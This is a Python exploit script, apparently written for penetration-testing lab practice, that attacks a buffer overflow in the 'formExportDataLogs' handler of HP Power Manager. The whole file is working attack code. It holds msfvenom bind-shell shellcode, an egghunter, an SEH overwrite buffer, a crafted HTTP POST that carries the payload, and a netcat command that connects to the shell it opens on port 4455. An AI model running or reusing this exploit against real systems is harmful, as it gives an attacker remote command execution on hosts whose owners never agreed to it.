#!/usr/bin/python
print """
##//#############################################################################################################
##							##							#
## Vulnerability: HP Power Manager 'formExportDataLogs' ##  FormExportDataLogs Buffer Overflow	 		#
## 							##  HP Power Manager				 	#
## Vulnerable Application: HP Power Manager	 	##  This is a part of the Metasploit Module, 		#
## Tested on Windows [Version 6.1.7600] 		##  exploit/windows/http/hp_power_manager_filename	#
##							##							#
## Author: Muhammad Haidari				##  Spawns a shell to same window			#
## Contact: ghmh@outlook.com				##							#
## Website: www.github.com/muhammd			##							#
##							##							#
##//#############################################################################################################
##
##
## TODO: adjust 
##
## Usage: python hpm_exploit.py <Remote IP Address>
"""

import urllib
import os
import sys
import struct
import time
from socket import *

try:
    HOST = sys.argv[1]
except IndexError:
    print "Usage: %s HOST" % sys.argv[0]
    sys.exit()

PORT = 80

# msfvenom -p windows/shell_bind_tcp LHOST=10.11.0.47 LPORT=4455  EXITFUNC=thread -b
# '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python


egg = "b33fb33f"
buf = egg
buf += "\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x83\x8e\x8e\x9a\x83\xee\xfc\xe2\xf4\x7f\x66"
buf += "\x0c\x9a\x83\x8e\xee\x13\x66\xbf\x4e\xfe\x08\xde\xbe"
buf += "\x11\xd1\x82\x05\xc8\x97\x05\xfc\xb2\x8c\x39\xc4\xbc"
buf += "\xb2\x71\x22\xa6\xe2\xf2\x8c\xb6\xa3\x4f\x41\x97\x82"
buf += "\x49\x6c\x68\xd1\xd9\x05\xc8\x93\x05\xc4\xa6\x08\xc2"
buf += "\x9f\xe2\x60\xc6\x8f\x4b\xd2\x05\xd7\xba\x82\x5d\x05"
buf += "\xd3\x9b\x6d\xb4\xd3\x08\xba\x05\x9b\x55\xbf\x71\x36"
buf += "\x42\x41\x83\x9b\x44\xb6\x6e\xef\x75\x8d\xf3\x62\xb8"
buf += "\xf3\xaa\xef\x67\xd6\x05\xc2\xa7\x8f\x5d\xfc\x08\x82"
buf += "\xc5\x11\xdb\x92\x8f\x49\x08\x8a\x05\x9b\x53\x07\xca"
buf += "\xbe\xa7\xd5\xd5\xfb\xda\xd4\xdf\x65\x63\xd1\xd1\xc0"
buf += "\x08\x9c\x65\x17\xde\xe6\xbd\xa8\x83\x8e\xe6\xed\xf0"
buf += "\xbc\xd1\xce\xeb\xc2\xf9\xbc\x84\x71\x5b\x22\x13\x8f"
buf += "\x8e\x9a\xaa\x4a\xda\xca\xeb\xa7\x0e\xf1\x83\x71\x5b"
buf += "\xf0\x8b\xd7\xde\x78\x7e\xce\xde\xda\xd3\xe6\x64\x95"
buf += "\x5c\x6e\x71\x4f\x14\xe6\x8c\x9a\x92\xe9\x07\x7c\xe9"
buf += "\x9e\xd8\xcd\xeb\x4c\x55\xad\xe4\x71\x5b\xcd\xeb\x39"
buf += "\x67\xa2\x7c\x71\x5b\xcd\xeb\xfa\x62\xa1\x62\x71\x5b"
buf += "\xcd\x14\xe6\xfb\xf4\xce\xef\x71\x4f\xeb\xed\xe3\xfe"
buf += "\x83\x07\x6d\xcd\xd4\xd9\xbf\x6c\xe9\x9c\xd7\xcc\x61"
buf += "\x73\xe8\x5d\xc7\xaa\xb2\x9b\x82\x03\xca\xbe\x93\x48"
buf += "\x8e\xde\xd7\xde\xd8\xcc\xd5\xc8\xd8\xd4\xd5\xd8\xdd"
buf += "\xcc\xeb\xf7\x42\xa5\x05\x71\x5b\x13\x63\xc0\xd8\xdc"
buf += "\x7c\xbe\xe6\x92\x04\x93\xee\x65\x56\x35\x6e\x87\xa9"
buf += "\x84\xe6\x3c\x16\x33\x13\x65\x56\xb2\x88\xe6\x89\x0e"
buf += "\x75\x7a\xf6\x8b\x35\xdd\x90\xfc\xe1\xf0\x83\xdd\x71"
buf += "\x4f"

# msfvenom -p windows/shell_bind_tcp LHOST=10.11.0.47 LPORT=4455  EXITFUNC=thread -b
# '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python

hunter = ""
hunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
hunter += "\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
hunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer = "\x41" * (721 - len(hunter))
buffer += "\x90" * 30 + hunter
buffer += "\xeb\xc2\x90\x90"  # JMP SHORT 0xC2
buffer += "\xd5\x74\x41"  # pop esi # pop ebx # ret 10 (DevManBE.exe)

content = "dataFormat=comma&exportto=file&fileName=%s" % urllib.quote_plus(buffer)
content += "&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload = "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: %s\r\n" % buf
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print "[+] Payload Fired... She will be back in less than a min..."
s.send(payload)
print "[+] Give me 30 Sec!"
time.sleep(30)
os.system("nc -nv " + HOST + " 4455")
s.close()
print "[+] Did you get your Proof.txt file?!?"
# note if you didn't get a bindshell, you may have to bump it to a minute time.sleep(60).